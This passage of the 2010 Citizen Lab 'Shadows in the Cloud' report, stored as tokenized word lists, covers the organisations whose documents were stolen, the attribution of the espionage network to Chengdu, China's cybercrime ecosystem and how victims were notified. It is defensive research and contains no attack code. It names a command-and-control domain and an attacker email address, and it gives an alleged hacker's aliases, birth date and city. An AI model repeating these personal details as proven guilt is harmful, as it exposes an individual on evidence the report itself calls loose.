"Korukonda", ",", "which", "prepares", "students", "for", "entry", "into", "the", "National", "Defence", "Academy", "."], ["One", "document", "is", "a", "detailed", "briefing", "on", "a", "live", "fire", "exercise", "while", "others", "pertain", "to", "surface", "-", "to", "-", "air", "missile", "systems", "and", "moving", "target", "indicators", "."], ["\u0083\u0083", "Military", "Educational", "Institutions", ",", "India"], ["We", "assess", "that", "computers", "at", "the", "Army", "Institute", "of", "Technology", "in", "Pune", ",", "Maharashtra", "and", "the", "Military", "College", "of", "Electronics", "and", "Mechanical", "Engineering", "in", "Secunderabad", ",", "Andhra", "Pradesh", "were", "compromised", "based", "on", "the", "documents", "exfiltrated", "by", "the", "attackers", "."], ["During", "the", "period", "in", "which", "we", "monitored", "the", "attackers", ",", "twentyone", "documents", ",", "including", "one", "marked", "\u201c", "RESTRICTED", "\u201d", ",", "were", "exfiltrated", "."], ["There", "are", "documents", "and", "presentations", "detailing", "the", "finances", "of", "one", "of", "the", "institutions", "as", "well", "as", "personal", "and", "private", "information", "on", "students", "and", "their", "travel", "."], ["There", "is", "also", "a", "document", "that", "describes", "\u201c", "Project", "Shakti", ",", "\u201d", "the", "Indian", "Army", "\u2019s", "command", "and", "control", "system", "for", "artillery", "(", "India", "Defence", "2007", ")", "."], ["\u0083\u0083", "Institute", "for", "Defence", "Studies", "and", "Analyses", ",", "India"], ["We", "assess", "that", "computers", "at", "the", "Institute", "for", "Defence", "Studies", "and", "Analyses", "(", "IDSA", ")", "were", "compromised", "based", "on", "the", "documents", "exfiltrated", "by", "the", "attackers", "."], ["During", "the", "period", "in", "which", "we", "monitored", "the", "attackers", ",", "187", "documents", "were", "exfiltrated", "."], ["While", "many", "of", "the", "documents", "were", "published", "papers", "from", "a", "variety", "of", "academic", "sources", ",", "there", "were", "internal", "documents", ",", "such", "as", "an", "overview", "of", "the", "IDSA", "research", "agenda", ",", "minutes", "of", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "4", ":", "TARGETS", "&", "EFFECTS", "35", "meetings", "for", "the", "Journal", "of", "Defence", "Studies", ",", "budgets", "and", "information", "on", "a", "variety", "of", "speakers", ",", "visitors", ",", "and", "conference", "participants", "."], ["\u0083\u0083", "Defence", "-", "oriented", "publications", ",", "India"], ["We", "assess", "that", "computers", "at", "the", "India", "Strategic", "defence", "magazine", "and", "FORCE", "magazine", "were", "compromised", "based", "on", "the", "documents", "exfiltrated", "by", "the", "attackers", "."], ["During", "the", "period", "in", "which", "we", "monitored", "the", "attackers", ",", "58", "documents", "were", "exfiltrated", "."], ["While", "these", "documents", "include", "publicly", "accessible", "articles", "and", "previous", "drafts", "of", "those", "articles", ",", "there", "is", "also", "private", "information", "regarding", "the", "contact", "details", "of", "subscribers", "and", "conference", "participants", "."], ["The", "documents", "also", "include", "interviews", ",", "documents", ",", "and", "PowerPoint", "presentations", "from", "conferences", "that", "detail", "national", "security", "topics", ",", "such", "as", "network", "data", "and", "monitoring", "for", "national", "security", ",", "and", "responses", "to", "combat", "cyber", "threats", "."], ["\u0083\u0083", "Corporations", ",", "India"], ["We", "assess", "that", "computers", "at", "YKK", "India", "Private", "Limited", ",", "DLF", "Limited", ",", "and", "TATA", "were", "compromised", "based", "on", "the", "documents", "exfiltrated", "by", "the", "attackers", "."], ["During", "the", "period", "in", "which", "we", "monitored", "the", "attackers", ",", "five", "documents", "were", "exfiltrated", "."], ["These", "documents", "include", "rules", "overseeing", "busiiness", "travel", ",", "a", "presentation", "on", "roadmap", "and", "financial", "status", ",", "and", "an", "annual", "plan", "for", "a", "business", "partnership", "."], ["\u0083\u0083", "Maritime", ",", "India"], ["We", "assess", "that", "computers", "at", "the", "National", "Maritime", "Foundation", "and", "the", "Gujarat", "Chemical", "Port", "Terminal", "Company", "Limited", "were", "compromised", "based", "on", "the", "documents", "exfiltrated", "by", "the", "attackers", "."], ["During", "the", "period", "in", "which", "we", "monitored", "the", "attackers", ",", "53", "documents", "were", "exfiltrated", "."], ["These", "documents", "include", "a", "summary", "of", "a", "seminar", "as", "well", "as", "numerous", "documents", "relating", "to", "specific", "shipping", "schedules", ",", "financial", "matters", "and", "personal", "medical", "information", "."], ["\u0083\u0083", "United", "Nations"], ["The", "United", "Nations", "Economic", "and", "Social", "Commission", "for", "Asia", "and", "the", "Pacific", "(", "UNESCAP", ")", "is", "based", "in", "Thailand", "and", "facilitates", "development", "in", "the", "Asia", "-", "Pacific", "region", "."], ["We", "assess", "that", "a", "computer", "at", "UNESCAP", "has", "been", "compromised", "based", "on", "the", "documents", "exfiltrated", "by", "the", "attackers", "."], ["In", "addition", "to", "information", "concerning", "a", "variety", "of", "conferences", "and", "presentations", ",", "there", "were", "also", "internal", "Mission", "Report", "documents", "regarding", "travel", "and", "events", "in", "the", "region", "."], ["PART", "5", ":"], ["Tackling", "Cyber", "Espionage", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "5", ":", "TACKLING", "CYBER", "ESPIONAGE", "37", "5.1", "Attribution", "and", "Cyber", "Crime", "/", "Cyber", "Espionage"], ["During", "this", "investigation", "we", "collected", "malware", "samples", "used", "by", "the", "attackers", ",", "which", "were", "primarily", "PDFs", "that", "exploited", "vulnerabilities", "in", "Adobe", "Acrobat", "and", "Adobe", "Reader", "."], ["In", "addition", ",", "we", "collected", "malware", "used", "by", "the", "attackers", "after", "successfully", "compromising", "a", "targeted", "system", "as", "well", "as", "network", "traffic", "captured", "from", "the", "OHHDL", "."], ["We", "were", "able", "to", "map", "out", "the", "command", "and", "control", "infrastructure", "of", "the", "attackers", "and", "in", "several", "cases", "view", "data", "that", "allowed", "us", "to", "identify", "targets", "that", "had", "been", "compromised", "and", "recover", "exfiltrated", "documents", "."], ["We", "did", "not", "have", "access", "to", "data", "regarding", "specific", "attacks", "on", "any", "of", "the", "targets", "we", "have", "identified", "."], ["In", "other", "words", ",", "we", "can", "not", "definitely", "tell", "how", "any", "one", "individual", "target", "was", "compromised", "."], ["And", ",", "more", "importantly", ",", "we", "do", "not", "have", "data", "regarding", "the", "behaviour", "of", "the", "attackers", "once", "inside", "the", "target", "\u2019s", "network", "."], ["However", ",", "we", "do", "have", "two", "key", "pieces", "of", "information", ":", "the", "first", "is", "an", "email", "address", "used", "in", "a", "document", "in", "the", "attackers", "\u2019", "possession", "that", "provided", "steps", "on", "how", "the", "attackers", "could", "use", "Yahoo", "!"], ["Mail", "as", "a", "command", "and", "control", "server", ";", "the", "second", "is", "the", "IP", "addresses", "used", "by", "the", "attackers", "to", "send", "emails", "from", "Yahoo", "!"], ["Mail", "accounts", "used", "as", "command", "and", "control", "servers", "."], ["Email", "addresses", "used", "by", "the", "attackers", "have", "proven", "to", "provide", "critical", "clues", "in", "past", "investigations", "."], ["Following", "the", "release", "of", "the", "GhostNet", "investigation", ",", "The", "Dark", "Visitor", "\u2014", "a", "blog", "that", "researches", "Chinese", "hacking", "activities", "\u2014", "investigated", "one", "of", "the", "email", "addresses", "we", "published", "that", "was", "used", "to", "register", "the", "domain", "names", "the", "attackers", "utilized", "as", "command", "and", "control", "servers", "."], ["While", "these", "were", "not", "GhostNet", "domain", "names", ",", "one", "of", "them", "is", "the", "same", "as", "one", "used", "by", "the", "attackers", "in", "this", "investigation", ":", "lookbytheway.net", "(", "Henderson", "2009a", ")", "."], ["The", "email", "address", "used", "to", "register", "lookbytheway.net", "is", "losttemp33@hotmail.com", "."], ["The", "Dark", "Visitor", "found", "forum", "posts", "made", "by", "losttemp33@hotmail.com", ",", "who", "also", "used", "the", "alias", "\u201c", "lost33", ".", "\u201d"], ["Further", "searching", "revealed", "\u201c", "an", "individual", "who", "was", "associated", "with", "Xfocus", ",", "Isbase", ",", "\u201d", "two", "popular", "Chinese", "hacking", "forums", ",", "and", "\u201c", "seems", "to", "have", "studied", "under", "Glacier", "\u201d", "(", "Henderson", "2009b", ")", "."], ["Glacier", "is", "known", "as", "\u201c", "Godfather", "of", "the", "Chinese", "Trojan", "\u201d", "(", "Henderson", "2007a", ")", ",", "and", "an", "association", "with", "him", "indicates", "lost33", "\u2019s", "connections", "to", "the", "hacking", "underground", "in", "the", "PRC", "."], ["Using", "information", "found", "on", "lost33", "\u2019s", "blog", ",", "The", "Dark", "Visitor", "was", "able", "to", "find", "another", "blog", "used", "by", "lost33", ",", "now", "operating", "under", "the", "alias", "\u201c", "damnfootman", "\u201d", ",", "and", "had", "a", "text", "chat", "conversation", "with", "him", "on", "the", "Chinese", "instant", "messenger", "service", "QQ", ",", "where", "the", "individual", "admitted", "to", "being", "the", "owner", "of", "the", "email", "address", "losttemp33@hotmail.com", "."], ["From", "this", "information", ",", "The", "Dark", "Visitor", "was", "able", "to", "determine", "this", "individual", "has", "connections", "to", "the", "forums", "of", "Xfocus", "and", "Isbase", "(", "the", "Green", "Army", ")", ",", "NSfocus", "and", "Eviloctal", ",", "as", "well", "as", "connections", "to", "the", "hackers", "Glacier", "and", "Sunwear", "."], ["He", "was", "born", "on", "July", "24", ",", "1982", ",", "lives", "in", "Chengdu", ",", "Sichuan", ",", "and", "attended", "the", "University", "of", "Electronic"], ["Science", "and", "Technology", "of", "China", ",", "which", "is", "also", "located", "in", "Chengdu", "."], ["Our", "investigation", "also", "indicated", "strong", "links", "to", "Chengdu", ",", "Sichuan", "."], ["The", "attacker", "used", "Yahoo", "!"], ["Mail", "accounts", "as", "command", "and", "control", "servers", ",", "from", "which", "the", "attacker", "sent", "emails", "containing", "new", "malware", "to", "the", "already", "compromised", "targets", "."], ["All", "of", "the", "IP", "addresses", "the", "attacker", "used", "when", "sending", "these", "emails", "are", "located", "in", "Chengdu", ",", "Sichuan", "."], ["We", "were", "able", "to", "retrieve", "a", "document", "from", "the", "attackers", "that", "indicated", "the", "steps", "neccessary", "to", "use", "Yahoo", "!"], ["Mail", "accounts", "as", "command", "and", "control", "servers", "."], ["There", "was", "also", "an", "account", "used", "by", "the", "attackers", "in", "this", "document", "for", "testing", "purposes", "."], ["Searches", "for", "this", "email", "address", "returned", "several", "advertisements", "for", "apartment", "rentals", "in", "Chengdu", ",", "Sichuan", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "5", ":", "TACKLING", "CYBER", "ESPIONAGE", "38"], ["The", "infrastructure", "of", "this", "particular", "network", "is", "tied", "to", "individuals", "in", "Chengdu", ",", "Sichuan", "."], ["At", "least", "one", "of", "these", "individuals", "has", "ties", "to", "the", "underground", "hacking", "community", "in", "the", "PRC", "and", "to", "the", "University", "of", "Electronic", "Science", "and", "Technology", "of", "China", "in", "Chengdu", "."], ["Interestingly", ",", "when", "the", "Honker", "Union", "of", "China", ",", "one", "of", "the", "largest", "hacking", "groups", "in", "the", "PRC", ",", "was", "re", "-", "established", "in", "2005", ",", "its", "new", "leader", "was", "a", "student", "at", "the", "University", "of", "Electronic"], ["Science", "and", "Technology", "in", "Chengdu", "."], ["Chengdu", "is", "also", "the", "location", "of", "one", "of", "the", "People", "\u2019s", "Liberation", "Army"], ["(", "PLA", ")", "\u2019s", "technical", "reconnaissance", "bureaus", "tasked", "with", "signals", "intelligence", "collection", "."], ["While", "it", "would", "be", "disingenuous", "to", "ignore", "these", "correlations", "entirely", ",", "they", "are", "loose", "at", "best", "and", "certainly", "do", "not", "meet", "the", "requirements", "of", "determining", "motivation", "and", "attribution", "."], ["However", ",", "the", "links", "between", "the", "command", "and", "control", "infrastructure", "and", "individuals", "in", "the", "PRC", "provide", "a", "variety", "of", "scenarios", "that", "point", "toward", "attribution", "."], ["5.1.2", "Patriotic", "Hacking"], ["The", "PRC", "has", "a", "vibrant", "hacker", "community", "that", "has", "been", "tied", "to", "targeted", "attacks", "in", "the", "past", ",", "and", "has", "been", "linked", "through", "informal", "channels", "to", "elements", "of", "the", "Chinese", "state", ",", "although", "the", "nature", "and", "extent", "of", "the", "connections", "remains", "unclear", "."], ["One", "common", "theme", "regarding", "attribution", "relating", "to", "attacks", "emerging", "from", "the", "PRC", "concerns", "variations", "of", "a", "privateering", "model", ",", "in", "which", "the", "state", "authorizes", "private", "persons", "to", "perform", "attacks", "against", "enemies", "of", "the", "state", "."], ["This", "model", "emerged", "because", "studies", "have", "shown", "that", "there", "is", "no", "direct", "government", "control", "over", "the", "loosely", "connected", "groups", "of", "hackers", "in", "the", "PRC", "(", "Henderson", "2007b", ")", "."], ["Even", "within", "the", "privateering", "approach", "there", "is", "much", "dispute", "regarding", "the", "exact", "relationship", "."], ["The", "degrees", "of", "the", "reported", "relationship", "vary", "between", "\u201c", "authorize", "\u201d", "to", "\u201c", "tacit", "consent", "\u201d", "to", "\u201c", "tolerate", "\u201d", "(", "Henderson", "2007b", ")", "."], ["However", ",", "this", "ambiguous", "relationship", "does", "not", "mean", "that", "there", "is", "no", "connection", "between", "the", "activities", "of", "Chinese", "hackers", "and", "the", "state", "."], ["The", "PRC", "\u2019s", "intelligence", "collection", "is", "based", "on", "the", "gathering", "of", "bits", "of", "information", "across", "a", "broad", "range", "of", "sources", ":"], ["China", "relies", "on", "a", "broad", "informal", "network", "of", "students", ",", "tourists", ",", "teachers", ",", "and", "foreign", "workers", "inside", "of", "host", "nations", "to", "collect", "small", "bits", "of", "information", "to", "form", "a", "composite", "picture", "of", "the", "environment", "."], ["Rather", "than", "set", "a", "targeted", "goal", "for", "collection", ",", "they", "instead", "rely", "on", "sheer", "weight", "of", "information", "to", "form", "a", "clear", "understanding", "of", "the", "situation", "."], ["(", "Henderson", "2007b", ")", "As", "a", "result", ",", "information", "that", "is", "independently", "obtained", "by", "the", "Chinese", "hacker", "community", "is", "likely", "to", "find", "its", "way", "to", "elements", "within", "the", "Chinese", "state", "."], ["However", ",", "the", "Chinese", "state", "is", "not", "monolithic", "."], ["It", "is", "a", "complex", "entity", "that", "includes", "cooperation", "and", "competition", "amoung", "a", "variety", "of", "entities", ",", "including", "the", "Communist", "Party", ",", "the", "PLA", "and", "the", "Government", "of", "China", "."], ["In", "addition", ",", "within", "each", "of", "those", "entities", "there", "are", "factions", "and", "rivalries", "."], ["Further", "complicating", "matters", "is", "that", "there", "are", "reported", "relationships", "between", "the", "edges", "of", "the", "government", "and", "networks", "of", "organized", "crime", "in", "the", "PRC", ",", "as", "in", "many", "other", "countries", "(", "Bakken", "2005", ";", "Keith", "and", "Lin", "2005", ")", "."], ["These", "complex", "relationships", "further", "complicate", "our", "understanding", "of", "the", "connections", "between", "the", "Chinese", "hacker", "community", "and", "the", "Chinese", "state", "."], ["While", "the", "PLA", "is", "developing", "computer", "network", "operations", "(", "CNO", ")", ",", "as", "are", "the", "armed", "forces", "of", "a", "wide", "variety", "of", "countries", ",", "its", "relationship", "with", "the", "hacker", "community", "appears", "to", "be", "minimal", ",", "as", "a", "recent", "study", "reports", ":", "Little", "evidence", "exists", "in", "open", "sources", "to", "establish", "firm", "ties", "between", "the", "PLA", "and", "China", "\u2019s", "hacker", "community", ",", "however", ",", "research", "did", "uncover", "limited", "cases", "of", "apparent", "collaboration", "between", "more", "elite", "individual", "hackers", "and", "the", "PRC", "\u2019s", "civilian", "security", "services", "."], ["The", "caveat", "to", "this", "is", "that", "amplifying", "details", "are", "extremely", "limited", "and", "these", "relationships", "are", "difficult", "to", "corroborate", "."], ["(", "Northrop", "Grumman", "2009", ")"], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "5", ":", "TACKLING", "CYBER", "ESPIONAGE", "39", "Moreover", ",", "the", "same", "study", "found", "that", "there", "is", "nothing", "that", "\u201c", "suggests", "that", "the", "PLA", "or", "state", "security", "bureaus", "intend", "to", "use", "hacktivist", "attacks", "as", "a", "component", "of", "a", "CNO", "campaign", "\u201d", "(", "Northrop", "Grumman", "2009", ")", "."], ["In", "addition", ",", "there", "are", "a", "variety", "of", "factors", ",", "such", "as", "the", "lack", "of", "command", "and", "control", ",", "precision", "targeting", "and", "the", "inability", "to", "maintain", "surprise", "and", "deception", ",", "that", "argue", "against", "the", "use", "of", "non", "-", "state", "hackers", "as", "part", "of", "the", "PLA", "\u2019s", "CNO", "strategy", "."], ["In", "fact", ",", "the", "relations", "between", "the", "hacker", "community", "and", "the", "state", "is", "more", "likely", "to", "be", "a", "concern", "of", "the", "Ministry", "of", "Public", "Security", "(", "Northrop", "Grumman", "2009", ";", "Henderson", "2007b", ")", "."], ["Interestingly", ",", "the", "Ministry", "of", "Public", "Security", "has", "focused", "primarily", "on", "internal", "security", "matters", ",", "which", "links", "with", "the", "emphasis", "on", "the", "Tibet", "-", "related", "targets", "documented", "in", "this", "report", "."], ["(", "the", "PRC", "views", "Tibet", "as", "an", "internal", "problem", ".", ")"], ["5.2.2", "Cyber", "Crime"], ["The", "activity", "of", "cyber", "criminals", "in", "the", "PRC", "parallels", "the", "activities", "of", "cyber", "criminals", "around", "the", "globe", "."], ["The", "Chinese", "hacker", "community", "has", "been", "known", "to", "engage", "in", "criminal", "activities", ",", "primarily", "motivated", "by", "profit", "."], ["Acting", "independently", "of", "state", "direction", ",", "they", "are", "involved", "in", "the", "buying", "and", "selling", "of", "malware", ",", "theft", "of", "intellectual", "property", ",", "theft", "of", "gaming", "credentials", ",", "fraud", ",", "blackmail", ",", "music", "and", "video", "piracy", ",", "and", "pornography", "(", "Henderson", "2007b", ")", "."], ["This", "activity", "is", "complex", "and", "further", "obfuscated", "by", "the", "move", "of", "Eastern", "European", "-", "based", "criminal", "networks", "into", "Chinese", "cyberspace", "(", "Vass", "2007", ")", "."], ["Researchers", "have", "identified", "several", "core", "components", "of", "the", "cyber", "crime", "ecosystem", "in", "the", "PRC", ":"], ["\u0083\u0083", "Malware", "Authors", "\u2013", "motivated", "by", "profit", "and/or", "stature", "within", "the", "blackhat", "community", ",", "malware", "authors", "leverage", "their", "technical", "skills", "to", "create", "and", "distribute", "exploits", "(", "including", "0day", "vulnerabilities", ")", "as", "well", "as", "trojan", "horse", "programs", "."], ["Their", "services", "are", "often", "advertised", "on", "discussion", "forums", "."], ["\u0083\u0083", "Website", "Masters", "/", "Crackers", "\u2013", "by", "maintaining", "malicious", "websites", ",", "exploiting", "vulnerable", "websites", "and", "providing", "hosting", "for", "the", "command", "and", "control", "capabilities", "of", "trojans", ",", "the", "website", "masters", "/", "crackers", "provide", "the", "infrastructure", "for", "cybercrime", "in", "the", "PRC", "\u0083\u0083", "\u201c", "Envelopes", "\u201d", "Stealers", "\u2013", "focus", "on", "acquiring", "username", "and", "password", "pairs", ",", "known", "as", "envelopes", ",", "through", "the", "use", "of", "malware", "kits", ",", "which", "are", "then", "sold", "."], ["They", "operate", "and", "maintain", "networks", "of", "infected", "computers", "but", "purchase", "services", "from", "malware", "authors", "and", "website", "masters", "/", "crackers", "to", "compensate", "for", "their", "general", "lack", "of", "technical", "skill", "."], ["\u0083\u0083", "Virtual", "Asset", "Stealers", "/", "Sellers", "\u2013", "by", "exploiting", "their", "knowledge", "of", "the", "underground", "economy", ","], ["virtual", "asset", "stealers", "/", "sellers", "purchase", "compromised", "credentials", "from", "envelopes", "stealers", "and", "sell", "virtual", "assets", "to", "online", "games", "players", ",", "QQ", "users", "and", "others", "who", "drive", "the", "demand", "for", "stolen", "virtual", "goods", "(", "Choo", "2008", ";", "Thibodeau", "2010", ";", "Zhuge", "et", "al", ".", "2009", ")", "."], ["In", "additional", "to", "politically", "sensitive", "information", ",", "we", "did", "find", "that", "personal", "information", ",", "including", "banking", "information", ",", "was", "exfiltrated", "by", "the", "attackers", "."], ["It", "is", "possible", "that", "in", "addition", "to", "exploiting", "the", "politically", "sensitive", "information", "the", "attacks", "may", "have", "also", "had", "an", "interest", "in", "exploiting", "the", "financial", "data", "that", "was", "stolen", "although", "we", "have", "no", "direct", "knowledge", "of", "such", "events", "occurring", "."], ["5.2.3", "Overall", "Assessment", "Attribution", "concerning", "cyber", "espionage", "networks", "is", "a", "complex", "task", ",", "given", "the", "inherently", "obscure", "modus", "operandi", "of", "the", "agents", "or", "groups", "under", "investigation", "."], ["Cyber", "criminals", "aim", "to", "mask", "their", "identities", ",", "and", "the", "networks", "investigated", "in", "this", "report", "are", "dispersed", "across", "multiple", "platforms", "and", "national", "jurisdictions", "."], ["Complicating", "matters", "further", "is", "the", "politicization", "of", "attribution", "questions", ",", "particularly", "concerning", "Chinese", "inten-", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "5", ":", "TACKLING", "CYBER", "ESPIONAGE", "40", "tions", "around", "information", "warfare", "."], ["Clearly", "this", "investigation", "and", "our", "analysis", "tracks", "back", "directly", "to", "the", "PRC", ",", "and", "to", "known", "entities", "within", "the", "criminal", "underground", "of", "the", "PRC", "."], ["There", "is", "also", "an", "obvious", "correlation", "to", "be", "drawn", "between", "the", "victims", ",", "the", "nature", "of", "the", "documents", "stolen", ",", "and", "the", "strategic", "interests", "of", "the", "Chinese", "state", "."], ["But", "correlations", "do", "not", "equal", "causation", "."], ["It", "is", "certainly", "possible", "that", "the", "attackers", "were", "directed", "in", "some", "manner", "\u2014", "either", "by", "sub", "-", "contract", "or", "privateering", "\u2014", "by", "agents", "of", "the", "Chinese", "state", ",", "but", "we", "have", "no", "evidence", "to", "prove", "that", "assertion", "."], ["It", "is", "also", "possible", "that", "the", "agents", "behind", "the", "Shadow", "network", "are", "operating", "for", "motives", "other", "than", "political", "espionage", ",", "as", "our", "investigation", "and", "analysis", "only", "uncovered", "a", "slice", "of", "what", "is", "undoubtedly", "a", "larger", "set", "of", "networks", "."], ["Even", "more", "remote", ",", "but", "still", "at", "least", "within", "the", "realm", "of", "possibility", ",", "is", "the", "false", "flag", "scenario", ",", "that", "another", "government", "altogether", "is", "masking", "a", "political", "espionage", "operation", "to", "appear", "as", "if", "it", "is", "coming", "from", "within", "the", "PRC", "."], ["Drawing", "these", "different", "scenarios", "and", "alternative", "explanations", "together", ",", "the", "most", "plausible", "explanation", ",", "and", "the", "one", "supported", "by", "the", "evidence", ",", "is", "that", "the", "Shadow", "network", "is", "based", "out", "of", "the", "PRC", "by", "one", "or", "more", "individuals", "with", "strong", "connections", "to", "the", "Chinese", "criminal", "underground", "."], ["Given", "the", "often", "murky", "relationships", "that", "can", "exist", "between", "this", "underground", "and", "elements", "of", "the", "state", ",", "the", "information", "collected", "by", "the", "Shadow", "network", "may", "end", "up", "in", "the", "possession", "of", "some", "entity", "of", "the", "Chinese", "government", "."], ["5.3", "Notification", "Investigations", "of", "malware", "activity", ",", "such", "as", "that", "undertaken", "as", "part", "of", "the", "Shadow", "and", "GhostNet", "investigations", ",", "can", "yield", "information", "about", "the", "network", "infrastructure", "of", "the", "attackers", ",", "information", "about", "those", "who", "have", "been", "compromised", ",", "and", "confidential", "or", "private", "documents", "or", "other", "data", "that", "may", "have", "been", "exfiltrated", "without", "prior", "knowledge", "."], ["Access", "to", "this", "information", "on", "all", "levels", "raises", "a", "number", "of", "practical", ",", "ethical", "and", "legal", "issues", ",", "many", "of", "which", "are", "unclear", "given", "the", "embryonic", "nature", "of", "the", "field", "of", "inquiry", "as", "a", "whole", "."], ["Throughout", "this", "investigation", ",", "we", "have", "been", "conscious", "of", "these", "issues", "and", "have", "attempted", "to", "meet", "a", "professional", "standard", "in", "terms", "of", "planning", "and", "documenting", "our", "steps", "taken", "in", "the", "process", "of", "notification", "."], ["This", "entailed", "research", "into", "existing", "practices", "and", "principles", ",", "and", "engagement", "with", "the", "law", "enforcement", ",", "intelligence", "and", "security", "communities", "in", "a", "number", "of", "countries", "."], ["We", "were", "also", "conscious", "of", "the", "need", "to", "comply", "with", "the", "domestic", "laws", "in", "whose", "context", "this", "investigation", "was", "undertaken", "\u2014", "namely", "those", "of", "India", ",", "the", "United", "States", "and", "Canada", "\u2014", "as", "well", "as", "principles", "governing", "all", "academic", "research", "at", "the", "University", "of", "Toronto", ",", "where", "the", "Citizen", "Lab", "is", "located", "."], ["Notification", "itself", "can", "be", "broken", "down", "into", "several", "categories", ",", "each", "of", "which", "entails", "complicating", "factors", "."], ["First", ",", "there", "is", "notification", "that", "is", "required", "to", "takedown", "the", "command", "and", "control", "infrastructure", ",", "typically", "to", "the", "hosting", "and", "service", "provider", "companies", "through", "which", "the", "malware", "networks", "operate", "and", "on", "which", "they", "are", "hosted", "."], ["Complicating", "matters", ",", "these", "services", "can", "be", "located", "in", "numerous", "national", "jurisdictions", "and", "subject", "to", "a", "variety", "of", "privacy", "laws", "and", "norms", "."], ["Second", ",", "there", "are", "issues", "around", "notification", "of", "victims", ",", "such", "as", "governments", ",", "businesses", ",", "NGOs", "and", "individuals", "."], ["This", "type", "of", "notification", "is", "perhaps", "the", "most", "challenging", "on", "ethical", ",", "practical", "and", "legal", "grounds", "."], ["Notification", "of", "governments", ",", "for", "example", ",", "can", "be", "a", "very", "sensitive", "matter", ",", "especially", "if", "classified", "documents", "are", "involved", "or", "information", "is", "retrieved", "that", "is", "relevant", "to", "national", "security", "concerns", "."], ["The", "same", "holds", "true", "of", "notification", "to", "individuals", "or", "businesses", "."], ["At", "what", "point", "should", "a", "researcher", "notify", "a", "victim", "?"], ["Who", "within", "the", "organization", ",", "whether", "it", "is", "a", "government", ",", "a", "business", "or", "an", "NGO", ",", "is", "the", "appropriate", "point", "of", "contact", "for", "the", "notification", "?"], ["What", "if", "the", "notification", "jeopardizes", "a", "third", "party", "\u2019s", "security", ",", "or", "leads", "to", "some", "kind", "of", "retaliation", "or", "retribution", "?"], ["Should", "researchers", "notify", "law", "enforcement", "and", "intelligence", "agencies", "in", "their", "own", "countries", "before", "reaching", "out", "to", "foreign", "governments", "?"], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "5", ":", "TACKLING", "CYBER", "ESPIONAGE", "41", "Existing", "practices", "in", "this", "area", "are", "underdeveloped", "and", "largely", "informal", "."], ["In", "part", ",", "this", "reflects", "the", "fact", "that", "global", "cyber", "security", "is", "still", "an", "embryonic", "field", "."], ["But", "it", "also", "speaks", "to", "the", "very", "real", "problem", "of", "competitive", "power", "politics", "at", "the", "highest", "levels", "of", "national", "security", ",", "which", "tend", "to", "restrict", "information", "sharing", "in", "sensitive", "areas", "around", "cyber", "crime", "and", "espionage", "."], ["Generally", "speaking", ",", "information", "sharing", "among", "law", "enforcement", "and", "intelligence", "agencies", "across", "borders", "is", "tentative", "at", "best", ",", "with", "the", "exception", "of", "that", "which", "occurs", "among", "close", "allies", "with", "deeply", "entrenched", "and", "long", "-", "standing", "links", "."], ["Outside", "of", "those", "security", "communities", ",", "notification", "of", "services", "and", "governments", "tends", "to", "be", "restricted", "to", "specialist", "technical", "communities", ",", "telecommunications", "operators", ",", "and", "network", "administrators", ",", "if", "it", "occurs", "at", "all", "."], ["Consequently", ",", "notification", "of", "the", "types", "referred", "to", "above", "can", "be", "ad", "hoc", "and", "inconsistent", ",", "largely", "contingent", "on", "the", "informal", "connections", "among", "professional", "communities", "."], ["All", "of", "these", "issues", "were", "grappled", "with", "in", "the", "aftermath", "of", "the", "Tracking", "GhostNet", "report", ",", "and", "throughout", "the", "course", "of", "the", "Shadow", "investigation", "."], ["Our", "experiences", "in", "the", "aftermath", "of", "GhostNet", ",", "where", "notification", "was", "left", "incomplete", ",", "prompted", "a", "more", "deliberate", "and", "self", "-", "conscious", "approach", "with", "the", "Shadow", "investigation", "."], ["We", "were", "also", "fortunate", "to", "have", "within", "our", "collaboration", "the", "experiences", "of", "the", "Shadowserver", "Foundation", ",", "whose", "counsel", "on", "notification", "helped", "in", "making", "decisions", "about", "timing", "and", "contacts", "."], ["By", "the", "end", "of", "November", "2009", ",", "we", "were", "confident", "in", "our", "access", "to", "the", "basic", "command", "and", "control", "infrastructure", "and", "identification", "of", "some", "of", "the", "key", "documents", "at", "hand", "."], ["Upon", "the", "realization", "that", "some", "information", "about", "individual", "Canadians", "was", "compromised", ",", "we", "notified", "Canadian", "authorities", "in", "December", "2009", "about", "the", "investigation", ",", "the", "compromise", "of", "Canadian", "-", "related", "information", ",", "and", "requested", "assistance", "on", "outreach", "with", "one", "of", "the", "victims", ",", "namely", "the", "Indian", "government", "."], ["At", "the", "same", "time", ",", "we", "independently", "explored", "whom", "we", "might", "contact", "in", "the", "Indian", "government", ",", "including", "making", "inquiries", "with", "Canada", "\u2019s", "Department", "of", "Foreign", "Affairs", "."], ["By", "February", "2010", ",", "we", "were", "able", "to", "find", "on", "our", "own", "what", "we", "thought", "was", "an", "appropriate", "contact", "in", "the", "Indian", "government", ",", "and", "gave", "a", "detailed", "notification", "to", "the", "National", "Technology", "Research", "Organization", "."], ["Our", "notification", "for", "takedown", "of", "the", "command", "and", "control", "infrastructure", "came", "later", "in", "the", "investigation", ",", "after", "we", "had", "collected", "and", "analyzed", "all", "of", "the", "information", "related", "to", "this", "report", ",", "but", "prior", "to", "its", "release", "."], ["Our", "experiences", "illustrate", "the", "intricate", ",", "nuanced", "and", "often", "confusing", "landscape", "of", "global", "cyber", "security", "notification", "practices", "."], ["The", "notification", "process", "will", "continue", "after", "the", "publication", "of", "this", "report", "."], ["PART", "6", ":", "Conclusions", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "6", ":", "CONCLUSIONS", "43", "Shadows", "in", "the", "Cloud", "points", "to", "a", "disturbing", "complex", "ecosystem", "of", "malware", "."], ["Although", "malware", "networks", ",", "cyber", "crime", "and", "espionage", "have", "been", "around", "for", "years", ",", "the", "evidence", "presented", "here", "shows", "how", "these", "networks", "can", "be", "aggressively", "adaptive", "systems", ",", "multipying", "and", "regenerating", "across", "multiple", "vectors", "and", "platforms", ",", "and", "exploting", "the", "vulnerabilties", "within", "the", "latest", "Web", "2.0", "technologies", "to", "expand", "their", "reach", "and", "impact", "."], ["Although", "there", "is", "rich", "detail", "to", "what", "is", "uncovered", "in", "the", "Shadow", "investigation", ",", "so", "much", "of", "the", "origins", ",", 